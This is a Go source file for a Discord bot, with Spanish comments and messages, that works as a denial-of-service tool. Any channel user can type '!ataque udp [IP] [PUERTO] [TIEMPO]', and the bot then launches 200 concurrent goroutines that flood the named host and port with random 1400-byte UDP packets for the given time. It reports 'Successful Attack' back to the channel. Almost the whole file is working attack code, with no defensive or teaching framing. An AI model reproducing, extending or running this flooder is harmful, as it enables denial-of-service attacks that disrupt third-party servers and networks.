package main

import (
	"bufio"
	"fmt"
	"math/rand"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/bwmarrin/discordgo"
)

func saveToken(token string) error {
	f, err := os.Create("token.txt")
	if err != nil {
		return err
	}
	defer f.Close()
	_, err = f.WriteString(token)
	return err
}

func readToken() (string, error) {
	// Intentamos leer el token del entorno, si no existe leemos del archivo
	token := os.Getenv("DISCORD_TOKEN")
	if token != "" {
		return token, nil
	}
	data, err := os.ReadFile("token.txt")
	if err != nil {
		return "", err
	}
	return strings.TrimSpace(string(data)), nil
}

func flood(target string, port int, duration int, wg *sync.WaitGroup) {
	defer wg.Done()

	raddr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", target, port))
	if err != nil {
		return
	}

	conn, err := net.DialUDP("udp", nil, raddr)
	if err != nil {
		return
	}
	defer conn.Close()

	endTime := time.Now().Add(time.Duration(duration) * time.Second)

	packetSize := 1400
	payload := make([]byte, packetSize)
	rand.Read(payload)

	for time.Now().Before(endTime) {
		_, err := conn.Write(payload)
		if err != nil {
			continue
		}
	}
}

func runFlood(target string, port, duration int) {
	rand.Seed(time.Now().UnixNano())
	threads := 200
	var wg sync.WaitGroup
	wg.Add(threads)

	for i := 0; i < threads; i++ {
		go flood(target, port, duration, &wg)
	}

	wg.Wait()
}

func main() {
	var token string
	var err error

	token, err = readToken()
	if err != nil {
		fmt.Println("Error al leer el token:", err)
		fmt.Print("Introduce el token de tu bot de Discord: ")
		reader := bufio.NewReader(os.Stdin)
		token, _ = reader.ReadString('\n')
		token = strings.TrimSpace(token)
		saveToken(token)
	}

	dg, err := discordgo.New("Bot " + token)
	if err != nil {
		fmt.Println("Error al crear sesión de Discord:", err)
		return
	}

	dg.AddHandler(func(s *discordgo.Session, m *discordgo.MessageCreate) {
		if m.Author.Bot {
			return
		}
		content := m.Content
		if strings.HasPrefix(content, "!ataque") {
			args := strings.Fields(content)
			if len(args) == 1 {
				s.ChannelMessageSend(m.ChannelID, "`!ataque udp [IP] [PUERTO] [TIEMPO]`")
				return
			}
			if len(args) == 5 && args[1] == "udp" {
				ip := args[2]
				port, err1 := strconv.Atoi(args[3])
				duration, err2 := strconv.Atoi(args[4])
				if err1 != nil || err2 != nil {
					s.ChannelMessageSend(m.ChannelID, "Puerto o tiempo no válido")
					return
				}
				s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Successful Attack IP:%s:%d Time: %d ", ip, port, duration))
				go func() {
					runFlood(ip, port, duration)
					s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Atack finish %s:%d finalizado.", ip, port))
				}()
				return
			}
			s.ChannelMessageSend(m.ChannelID, "`!ataque udp [IP] [PUERTO] [TIEMPO]`")
		}
	})

	err = dg.Open()
	if err != nil {
		fmt.Println("Error al abrir la conexión:", err)
		return
	}
	fmt.Println("Bot ON¡!")
	select {}
}
